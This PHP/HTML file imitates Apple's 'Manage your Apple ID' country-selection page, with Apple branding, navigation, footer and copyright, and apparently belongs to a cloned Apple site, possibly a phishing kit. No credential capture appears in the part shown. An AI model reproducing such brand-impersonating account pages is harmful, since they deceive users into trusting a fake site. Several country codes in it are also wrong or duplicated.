<?php
session_start();
require_once("inc/countries.php");
if(isset($_SESSION['country_code']) && isset($_SESSION['country_language'])) {
  require_once("language/".$_SESSION['country_language'].".php");
} else {
  $_SESSION['country_code'] = "usa";
  $_SESSION['country_language'] = "en";
  require_once("language/en.php");
}
?>
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Manage your Apple ID</title>
    <link rel="stylesheet" href="assets/master.css" media="screen" title="no title" charset="utf-8">
    <link rel="icon" href="img/favicon.ico" />
    <script src="assets/languagemaster.js" charset="utf-8"></script>
  </head>
  <body style="background-color : #EEE;">
    <div class="wrapper">
      <div class="navigation-bar" style="background : rgba(0,0,0,0.8) !important;">
        <div class="navigation-wrapper">
          <div class="logo" onclick="window.location='index.php'"></div>
          <ul id="menu_list">
            <li><a href="#" id="head_item1">Mac</a></li>
            <li><a href="#" id="head_item2">iPad</a></li>
            <li><a href="#" id="head_item3">iPhone</a></li>
            <li><a href="#" id="head_item4">Watch</a></li>
            <li><a href="#" id="head_item5">TV</a></li>
            <li><a href="#" id="head_item6">Music</a></li>
            <li><a href="#" id="head_item7">Support</a></li>
          </ul>
          <div class="search" id="search_icon"></div>
          <div class="shoppingbag" id="shoppingbag"></div>
          <input id="searchbox" class="searchbox hidden" placeholder="Search apple.com"/>
          <div class="cross hidden" id="krisskross"></div>
        </div>
      </div>
      <div class="account_body" style="text-align : left !important; ">
        <h1 class="lefth1">Apple ID</h1>
        <div class="region">
          <h1>Africa, Middle East, and India</h1>
          <div class="sep"></div>
          <div class="subregion">
            <div class="row">
              <div class="country" onclick="changeLang('dz');">
                <div class="flag dz_flag"></div>
                <h2>Algeria</h2>
              </div>
              <div class="country" onclick="changeLang('ao');">
                <div class="flag ag_flag"></div>
                <h2>Angola</h2>
              </div>
              <div class="country" onclick="changeLang('am');">
                <div class="flag arm_flag"></div>
                <h2>Armenia</h2>
              </div>
              <div class="country" onclick="changeLang('az');">
                <div class="flag azr_flag"></div>
                <h2>Azerbaijan</h2>
              </div>
              <div class="country" onclick="changeLang('bh');">
                <div class="flag bahr_flag"></div>
                <h2>Bahrain</h2>
              </div>
            </div>
            <div class="row">
              <div class="country" onclick="changeLang('bj');">
                <div class="flag ben_flag"></div>
                <h2>Benin</h2>
              </div>
              <div class="country" onclick="changeLang('bw');">
                <div class="flag bots_flag"></div>
                <h2>Botswana</h2>
              </div>
              <div class="country" onclick="changeLang('bf');">
                <div class="flag burk_flag"></div>
                <h2>Burkina-Faso</h2>
              </div>
              <div class="country" onclick="changeLang('cv');">
                  <div class="flag cape_verde_flag"></div>
                  <h2>Cape Verde</h2>
              </div>
              <div class="country" onclick="changeLang('td');">
                  <div class="flag chad_flag"></div>
                  <h2>Chad</h2>
              </div>
            </div>
            <div class="row">
              <div class="country" onclick="changeLang('cd');">
                  <div class="flag congo_flag"></div>
                  <h2>Congo (Republic of)</h2>
              </div>
              <div class="country" onclick="changeLang('eg');">
                  <div class="flag egypt_flag"></div>
                  <h2>Egypt</h2>
              </div>
              <div class="country" onclick="changeLang('gm');">
                  <div class="flag gambia_flag"></div>
                  <h2>Gambia</h2>
              </div>
              <div class="country" onclick="changeLang('gh');">
                  <div class="flag ghana_flag"></div>
                  <h2>Ghana</h2>
              </div>
              <div class="country" onclick="changeLang('gw');">
                  <div class="flag guinea_bissau_flag"></div>
                  <h2>Guinea-Bissau</h2>
              </div>
            </div>
            <div class="row">
              <div class="country" onclick="changeLang('in');">
                  <div class="flag india_flag"></div>
                  <h2>India</h2>
              </div>
              <div class="country" onclick="changeLang('il');">
                  <div class="flag israel_flag"></div>
                  <h2>Israel</h2>
              </div>
              <div class="country" onclick="changeLang('jo');">
                  <div class="flag jordan_flag"></div>
                  <h2>Jordan</h2>
              </div>
              <div class="country" onclick="changeLang('ke');">
                  <div class="flag kenya_flag"></div>
                  <h2>Kenya</h2>
              </div>
              <div class="country" onclick="changeLang('kw');">
                  <div class="flag kuwait_flag"></div>
                  <h2>Kuwait</h2>
              </div>
            </div>
            <div class="row">
              <div class="country" onclick="changeLang('lr');">
                  <div class="flag liberia_flag"></div>
                  <h2>Liberia</h2>
              </div>
              <div class="country" onclick="changeLang('mg');">
                  <div class="flag madagascar_flag"></div>
                  <h2>Madagascar</h2>
              </div>
              <div class="country" onclick="changeLang('mw');">
                  <div class="flag malawi_flag"></div>
                  <h2>Malawi</h2>
              </div>
              <div class="country" onclick="changeLang('ml');">
                  <div class="flag mali_flag"></div>
                  <h2>Mali</h2>
              </div>
              <div class="country" onclick="changeLang('ma');">
                  <div class="flag mauritania_flag"></div>
                  <h2>Mauritania</h2>
              </div>
            </div>
            <div class="row">
              <div class="country" onclick="changeLang('mu');">
                  <div class="flag mauritius_flag"></div>
                  <h2>Mauritius</h2>
              </div>
              <div class="country" onclick="changeLang('mz');">
                  <div class="flag mozambique_flag"></div>
                  <h2>Mozambique</h2>
              </div>
              <div class="country" onclick="changeLang('na');">
                  <div class="flag namibia_flag"></div>
                  <h2>Namibia</h2>
              </div>
              <div class="country" onclick="changeLang('ne');">
                  <div class="flag niger_flag"></div>
                  <h2>Niger</h2>
              </div>
              <div class="country" onclick="changeLang('ng');">
                  <div class="flag nigeria_flag"></div>
                  <h2>Nigeria</h2>
              </div>
            </div>
            <div class="row">
              <div class="country" onclick="changeLang('om');">
                  <div class="flag oman_flag"></div>
                  <h2>Oman</h2>
              </div>
              <div class="country" onclick="changeLang('qa');">
                  <div class="flag qatar_flag"></div>
                  <h2>Qatar</h2>
              </div>
              <div class="country" onclick="changeLang('st');">
                  <div class="flag sao_tome_principe_flag"></div>
                  <h2>Sao Tome e Principe</h2>
              </div>
              <div class="country" onclick="changeLang('sa');">
                  <div class="flag saudi_arabia_flag"></div>
                  <h2>Saudi Arabia</h2>
              </div>
              <div class="country" onclick="changeLang('sn');">
                  <div class="flag senegal_flag"></div>
                  <h2>Senegal</h2>
              </div>
            </div>
            <div class="row">
              <div class="country" onclick="changeLang('sc');">
                  <div class="flag seychelles_flag"></div>
                  <h2>Seychelles</h2>
              </div>
              <div class="country" onclick="changeLang('sl');">
                  <div class="flag sierra_leone_flag"></div>
                  <h2>Sierra Leone</h2>
              </div>
              <div class="country" onclick="changeLang('za');">
                  <div class="flag south_africa_flag"></div>
                  <h2>South Africa</h2>
              </div>
              <div class="country" onclick="changeLang('sz');">
                  <div class="flag swaziland_flag"></div>
                  <h2>Swaziland</h2>
              </div>
              <div class="country" onclick="changeLang('tz');">
                  <div class="flag tanzania_flag"></div>
                  <h2>Tanzania</h2>
              </div>
            </div>
            <div class="row">
              <div class="country" onclick="changeLang('tn');">
                  <div class="flag tunisia_flag"></div>
                  <h2>Tunisia</h2>
              </div>
              <div class="country" onclick="changeLang('ug');">
                  <div class="flag uganda_flag"></div>
                  <h2>Uganda</h2>
              </div>
              <div class="country" onclick="changeLang('ae');">
                  <div class="flag united_arab_emirates_flag"></div>
                  <h2>United Arab Emirates</h2>
              </div>
              <div class="country" onclick="changeLang('zw');">
                  <div class="flag zimbabwe_flag"></div>
                  <h2>Zimbabwe</h2>
              </div>
            </div>
          </div>
          <h1>Asia Pacific</h1>
          <div class="sep"></div>
          <div class="subregion">
            <div class="row">
              <div class="country" onclick="changeLang('au');">
                  <div class="flag australia_flag"></div>
                  <h2>Australia</h2>
              </div>
              <div class="country" onclick="changeLang('bt');">
                  <div class="flag bhutan_flag"></div>
                  <h2>Bhutan</h2>
              </div>
              <div class="country" onclick="changeLang('bn');">
                  <div class="flag brunei_darussalam_flag"></div>
                  <h2>Brunei Darussalam</h2>
              </div>
              <div class="country" onclick="changeLang('kh');">
                  <div class="flag cambodia_flag"></div>
                  <h2>Cambodia</h2>
              </div>
              <div class="country" onclick="changeLang('cn');">
                  <div class="flag china_flag"></div>
                  <h2>China</h2>
              </div>
            </div>
            <div class="row">
              <div class="country" onclick="changeLang('fj');">
                  <div class="flag fiji_flag"></div>
                  <h2>Fiji</h2>
              </div>
              <div class="country" onclick="changeLang('hk');">
                  <div class="flag hong_kong_flag"></div>
                  <h2>Hong Kong</h2>
              </div>
              <div class="country" onclick="changeLang('id');">
                  <div class="flag indonesia_flag"></div>
                  <h2>Indonesia</h2>
              </div>
              <div class="country" onclick="changeLang('jp');">
                  <div class="flag japan_flag"></div>
                  <h2>Japan</h2>
              </div>
              <div class="country" onclick="changeLang('kz');">
                  <div class="flag kazakstan_flag"></div>
                  <h2>Kazakstan</h2>
              </div>
            </div>
            <div class="row">
              <div class="country" onclick="changeLang('kp');">
                  <div class="flag korea_flag"></div>
                  <h2>Korea</h2>
              </div>
              <div class="country" onclick="changeLang('kg');">
                  <div class="flag kyrgyzstan_flag"></div>
                  <h2>Kyrgyzstan</h2>
              </div>
              <div class="country" onclick="changeLang('la');">
                  <div class="flag laos_flag"></div>
                  <h2>Laos</h2>
              </div>
              <div class="country" onclick="changeLang('lb');">
                  <div class="flag lebanon_flag"></div>
                  <h2>Lebanon</h2>
              </div>
              <div class="country" onclick="changeLang('mo');">
                  <div class="flag macau_flag"></div>
                  <h2>Macau</h2>
              </div>
            </div>
            <div class="row">
              <div class="country" onclick="changeLang('ml');">
                  <div class="flag malaysia_flag"></div>
                  <h2>Malaysia</h2>
              </div>
              <div class="country" onclick="changeLang('fm');">
                  <div class="flag micronesia_flag"></div>
                  <h2>Micronesia</h2>
              </div>
              <div class="country" onclick="changeLang('mn');">
                  <div class="flag mongolia_flag"></div>
                  <h2>Mongolia</h2>
              </div>
              <div class="country" onclick="changeLang('np');">
                  <div class="flag nepal_flag"></div>
                  <h2>Nepal</h2>
              </div>
              <div class="country" onclick="changeLang('nz');">
                  <div class="flag new_zealand_flag"></div>
                  <h2>New Zealand</h2>
              </div>
            </div>
            <div class="row">
              <div class="country" onclick="changeLang('pk');">
                  <div class="flag pakistan_flag"></div>
                  <h2>Pakistan</h2>
              </div>
              <div class="country" onclick="changeLang('pw');">
                  <div class="flag palau_flag"></div>
                  <h2>Palau</h2>
              </div>
              <div class="country" onclick="changeLang('pg');">
                  <div class="flag papua_new_guinea_flag"></div>
                  <h2>Papua New Guinea</h2>
              </div>
              <div class="country" onclick="changeLang('ph');">
                  <div class="flag philippines_flag"></div>
                  <h2>Philippines</h2>
              </div>
              <div class="country" onclick="changeLang('sg');">
                  <div class="flag singapore_flag"></div>
                  <h2>Singapore</h2>
              </div>
            </div>
            <div class="row">
              <div class="country" onclick="changeLang('sb');">
                  <div class="flag solomon_islands_flag"></div>
                  <h2>Solomon Islands</h2>
              </div>
              <div class="country" onclick="changeLang('lk');">
                  <div class="flag sri_lanka_flag"></div>
                  <h2>Sri Lanka</h2>
              </div>
              <div class="country" onclick="changeLang('tw');">
                  <div class="flag taiwan_flag"></div>
                  <h2>Taiwan</h2>
              </div>
              <div class="country" onclick="changeLang('tj');">
                  <div class="flag tajikistan_flag"></div>
                  <h2>Tajikistan</h2>
              </div>
              <div class="country" onclick="changeLang('th');">
                  <div class="flag thailand_flag"></div>
                  <h2>Thailand</h2>
              </div>
            </div>
            <div class="row">
              <div class="country" onclick="changeLang('tm');">
                  <div class="flag turkmenistan_flag"></div>
                  <h2>Turkmenistan</h2>
              </div>
              <div class="country" onclick="changeLang('uz');">
                  <div class="flag uzbekistan_flag"></div>
                  <h2>Uzbekistan</h2>
              </div>
              <div class="country" onclick="changeLang('vn');">
                  <div class="flag vietnam_flag"></div>
                  <h2>Vietnam</h2>
              </div>
              <div class="country" onclick="changeLang('ye');">
                  <div class="flag yemen_flag"></div>
                  <h2>Yemen</h2>
              </div>
              <div class="country" onclick="changeLang('en');">
                  <div class="flag generic_flag"></div>
                  <h2>Other Asia</h2>
              </div>
            </div>
          </div>
          <h1>Europe</h1>
          <div class="sep"></div>
          <div class="subregion">
            <div class="row">
              <div class="country" onclick="changeLang('al');">
                  <div class="flag albania_flag"></div>
                  <h2>Albania</h2>
              </div>
              <div class="country" onclick="changeLang('by');">
                  <div class="flag belarus_flag"></div>
                  <h2>Belarus</h2>
              </div>
              <div class="country" onclick="changeLang('be');">
                  <div class="flag belgium_flag"></div>
                  <h2>Belgium</h2>
              </div>
              <div class="country" onclick="changeLang('bg');">
                  <div class="flag bulgaria_flag"></div>
                  <h2>Bulgaria</h2>
              </div>
              <div class="country" onclick="changeLang('cr');">
                  <div class="flag croatia_flag"></div>
                  <h2>Croatia</h2>
              </div>
            </div>
            <div class="row">
              <div class="country" onclick="changeLang('cz');">
                  <div class="flag czech_republic_flag"></div>
                  <h2>Czech Republic</h2>
              </div>
              <div class="country" onclick="changeLang('cy');">
                  <div class="flag cyprus_flag"></div>
                  <h2>Cyprus</h2>
              </div>
              <div class="country" onclick="changeLang('dk');">
                  <div class="flag denmark_flag"></div>
                  <h2>Denmark</h2>
              </div>
              <div class="country" onclick="changeLang('de');">
                  <div class="flag germany_flag"></div>
                  <h2>Germany</h2>
              </div>
              <div class="country" onclick="changeLang('sp');">
                  <div class="flag spain_flag"></div>
                  <h2>Spain</h2>
              </div>
            </div>
            <div class="row">
              <div class="country" onclick="changeLang('ee');">
                  <div class="flag estonia_flag"></div>
                  <h2>Estonia</h2>
              </div>
              <div class="country" onclick="changeLang('fr');">
                  <div class="flag france_flag"></div>
                  <h2>France</h2>
              </div>
              <div class="country" onclick="changeLang('gr');">
                  <div class="flag greece_flag"></div>
                  <h2>Greece</h2>
              </div>
              <div class="country" onclick="changeLang('is');">
                  <div class="flag iceland_flag"></div>
                  <h2>Iceland</h2>
              </div>
              <div class="country" onclick="changeLang('ie');">
                  <div class="flag ireland_flag"></div>
                  <h2>Ireland</h2>
              </div>
            </div>
            <div class="row">
              <div class="country" onclick="changeLang('it');">
                  <div class="flag italy_flag"></div>
                  <h2>Italy</h2>
              </div>
              <div class="country" onclick="changeLang('lv');">
                  <div class="flag latvia_flag"></div>
                  <h2>Latvia</h2>
              </div>
              <div class="country" onclick="changeLang('lt');">
                  <div class="flag lithuania_flag"></div>
                  <h2>Lithuania</h2>
              </div>
              <div class="country" onclick="changeLang('lu');">
                  <div class="flag luxembourg_flag"></div>
                  <h2>Luxembourg</h2>
              </div>
              <div class="country" onclick="changeLang('mk');">
                  <div class="flag macedonia_flag"></div>
                  <h2>Macedonia</h2>
              </div>
            </div>
            <div class="row">
              <div class="country" onclick="changeLang('hu');">
                  <div class="flag hungary_flag"></div>
                  <h2>Hungary</h2>
              </div>
              <div class="country" onclick="changeLang('mt');">
                  <div class="flag malta_flag"></div>
                  <h2>Malta</h2>
              </div>
              <div class="country" onclick="changeLang('md');">
                  <div class="flag moldova_flag"></div>
                  <h2>Moldova</h2>
              </div>
              <div class="country" onclick="changeLang('nl');">
                  <div class="flag netherlands_flag"></div>
                  <h2>Netherlands</h2>
              </div>
              <div class="country" onclick="changeLang('no');">
                  <div class="flag norway_flag"></div>
                  <h2>Norway</h2>
              </div>
            </div>
            <div class="row">
              <div class="country" onclick="changeLang('au');">
                  <div class="flag austria_flag"></div>
                  <h2>Austria</h2>
              </div>
              <div class="country" onclick="changeLang('pl');">
                  <div class="flag poland_flag"></div>
                  <h2>Polska</h2>
              </div>
              <div class="country" onclick="changeLang('pt');">
                  <div class="flag portugal_flag"></div>
                  <h2>Portugal</h2>
              </div>
              <div class="country" onclick="changeLang('ro');">
                  <div class="flag romania_flag"></div>
                  <h2>Romania</h2>
              </div>
              <div class="country" onclick="changeLang('ru');">
                  <div class="flag russia_flag"></div>
                  <h2>Russia</h2>
              </div>
            </div>
            <div class="row">
              <div class="country" onclick="changeLang('ch');">
                  <div class="flag switzerland_flag"></div>
                  <h2>Switzerland</h2>
              </div>
              <div class="country" onclick="changeLang('sk');">
                  <div class="flag slovakia_flag"></div>
                  <h2>Slovakia</h2>
              </div>
              <div class="country" onclick="changeLang('si');">
                  <div class="flag slovenia_flag"></div>
                  <h2>Slovenia</h2>
              </div>
              <div class="country" onclick="changeLang('fi');">
                  <div class="flag finland_flag"></div>
                  <h2>Finland</h2>
              </div>
              <div class="country" onclick="changeLang('se');">
                  <div class="flag sweden_flag"></div>
                  <h2>Sweden</h2>
              </div>
            </div>
            <div class="row">
              <div class="country" onclick="changeLang('tr');">
                  <div class="flag turkey_flag"></div>
                  <h2>Turkey</h2>
              </div>
              <div class="country" onclick="changeLang('uk');">
                  <div class="flag uk_flag"></div>
                  <h2>UK</h2>
              </div>

            </div>
          </div>
          <h1>Latin America and the Carribean</h1>
          <div class="sep"></div>
          <div class="subregion">
            <div class="row">
              <div class="country" onclick="changeLang('ai');">
                  <div class="flag anguilla_flag"></div>
                  <h2>Anguilla</h2>
              </div>
              <div class="country" onclick="changeLang('ag');">
                  <div class="flag antigua_and_barbuda_flag"></div>
                  <h2>Antigua And Barbuda</h2>
              </div>
              <div class="country" onclick="changeLang('ar');">
                  <div class="flag argentina_flag"></div>
                  <h2>Argentina</h2>
              </div>
              <div class="country" onclick="changeLang('bs');">
                  <div class="flag bahamas_flag"></div>
                  <h2>Bahamas</h2>
              </div>
              <div class="country" onclick="changeLang('bb');">
                  <div class="flag barbados_flag"></div>
                  <h2>Barbados</h2>
              </div>
            </div>
            <div class="row">
              <div class="country" onclick="changeLang('bz');">
                  <div class="flag belize_flag"></div>
                  <h2>Belize</h2>
              </div>
              <div class="country" onclick="changeLang('bm');">
                  <div class="flag bermuda_flag"></div>
                  <h2>Bermuda</h2>
              </div>
              <div class="country" onclick="changeLang('bo');">
                  <div class="flag bolivia_flag"></div>
                  <h2>Bolivia</h2>
              </div>
              <div class="country" onclick="changeLang('br');">
                  <div class="flag brazil_flag"></div>
                  <h2>Brazil</h2>
              </div>
              <div class="country" onclick="changeLang('ky');">
                  <div class="flag cayman_islands_flag"></div>
                  <h2>Cayman Islands</h2>
              </div>
            </div>
            <div class="row">
              <div class="country" onclick="changeLang('cl');">
                  <div class="flag chile_flag"></div>
                  <h2>Chile</h2>
              </div>
              <div class="country" onclick="changeLang('co');">
                  <div class="flag colombia_flag"></div>
                  <h2>Colombia</h2>
              </div>
              <div class="country" onclick="changeLang('cr');">
                  <div class="flag costa_rica_flag"></div>
                  <h2>Costa Rica</h2>
              </div>
              <div class="country" onclick="changeLang('dm');">
                  <div class="flag dominica_flag"></div>
                  <h2>Dominica</h2>
              </div>
              <div class="country" onclick="changeLang('do');">
                  <div class="flag dominica_flag"></div>
                  <h2>Republica Dominicana</h2>
              </div>
            </div>
            <div class="row">
              <div class="country" onclick="changeLang('ec');">
                  <div class="flag ecuador_flag"></div>
                  <h2>Ecuador</h2>
              </div>
              <div class="country" onclick="changeLang('sv');">
                  <div class="flag el_salvador_flag"></div>
                  <h2>El Salvador</h2>
              </div>
              <div class="country" onclick="changeLang('gd');">
                  <div class="flag grenada_flag"></div>
                  <h2>Grenada</h2>
              </div>
              <div class="country" onclick="changeLang('gt');">
                  <div class="flag guatemala_flag"></div>
                  <h2>Guatemala</h2>
              </div>
              <div class="country" onclick="changeLang('ni');">
                  <div class="flag nicaragua_flag"></div>
                  <h2>Nicaragua</h2>
              </div>
            </div>
            <div class="row">
              <div class="country" onclick="changeLang('gy');">
                  <div class="flag guyana_flag"></div>
                  <h2>Guyana</h2>
              </div>
              <div class="country" onclick="changeLang('hn');">
                  <div class="flag honduras_flag"></div>
                  <h2>Honduras</h2>
              </div>
              <div class="country" onclick="changeLang('jm');">
                  <div class="flag jamaica_flag"></div>
                  <h2>Jamaica</h2>
              </div>
              <div class="country" onclick="changeLang('mx');">
                  <div class="flag mexico_flag"></div>
                  <h2>Mexico</h2>
              </div>
              <div class="country" onclick="changeLang('ms');">
                  <div class="flag montserrat_flag"></div>
                  <h2>Montserrat</h2>
              </div>

            </div>
            <div class="row">
              <div class="country" onclick="changeLang('pa');">
                  <div class="flag panama_flag"></div>
                  <h2>Panama</h2>
              </div>
              <div class="country" onclick="changeLang('py');">
                  <div class="flag paraguay_flag"></div>
                  <h2>Paraguay</h2>
              </div>
              <div class="country" onclick="changeLang('pe');">
                  <div class="flag peru_flag"></div>
                  <h2>Peru</h2>
              </div>
              <div class="country" onclick="changeLang('kn');">
                  <div class="flag saint_kitts_nevis_flag"></div>
                  <h2>Saint Kitts & Nevis</h2>
              </div>
              <div class="country" onclick="changeLang('lc');">
                  <div class="flag saint_lucia_flag"></div>
                  <h2>Saint Lucia</h2>
              </div>
            </div>
            <div class="row">
              <div class="country" onclick="changeLang('vc');">
                  <div class="flag saint_vincent_grenadines_flag"></div>
                  <h2>Saint Vincent</h2>
              </div>
              <div class="country" onclick="changeLang('sr');">
                  <div class="flag suriname_flag"></div>
                  <h2>Suriname</h2>
              </div>
              <div class="country" onclick="changeLang('tt');">
                  <div class="flag trinidad_and_tobago_flag"></div>
                  <h2>Trinidad & Tobago</h2>
              </div>
              <div class="country" onclick="changeLang('tc');">
                  <div class="flag turks_and_caicos_flag"></div>
                  <h2>Turks & Caicos</h2>
              </div>
              <div class="country" onclick="changeLang('uy');">
                  <div class="flag uruguay_flag"></div>
                  <h2>Uruguay</h2>
              </div>
            </div>
            <div class="row">
              <div class="country" onclick="changeLang('ve');">
                  <div class="flag venezuela_flag"></div>
                  <h2>Venezuela</h2>
              </div>
              <div class="country" onclick="changeLang('vg');">
                  <div class="flag virgin_islands_british_flag"></div>
                  <h2>Virgin Islands, British</h2>
              </div>
              <div class="country" onclick="changeLang('en');">
                  <div class="flag generic_flag"></div>
                  <h2>Latin America</h2>
              </div>
            </div>
          </div>
          <h1>The United States, Canada, and Puerto Rico</h1>
          <div class="sep"></div>
          <div class="subregion">
            <div class="row">
              <div class="country" onclick="changeLang('ca');">
                  <div class="flag canada_flag"></div>
                  <h2>Canada</h2>
              </div>
              <div class="country" onclick="changeLang('usa');">
                  <div class="flag usa_flag"></div>
                  <h2>USA</h2>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div class="footer" style="background-color : #EEE;">
        <div class="wrapper">
          <div class="main">
            <h1>More ways to shop: Visit an <a class="nonmenu click" href="">Apple Store</a>, call 1-800-MY-APPLE, or <a class="nonmenu click" href="">find a reseller</a>. </h1>
            <h2>Copyright &copy; 2017 Apple Inc. All rights reserved.</h2>
            <ul>
              <li><a class="nonmenu" href="">Privacy Policy</a></li>
              <div class="stick"></div>
              <li><a class="nonmenu" href="">Terms of Use</a></li>
              <div class="stick"></div>
              <li><a class="nonmenu" href="">Sales and Refunds</a></li>
              <div class="stick"></div>
              <li><a class="nonmenu" href="">Legal</a></li>
              <div class="stick"></div>
              <li><a class="nonmenu" href="">Site Map</a></li>
              <li class="country"><div class="mini_flag <?php echo $code_class[$_SESSION['country_code']]; ?>"></div><a class="nonmenu" href="language.php"><?php echo $code_country[$_SESSION['country_code']]; ?></a></li>
            </ul>
          </div>
        </div>
      </div>
    </div>
  </body>
</html>
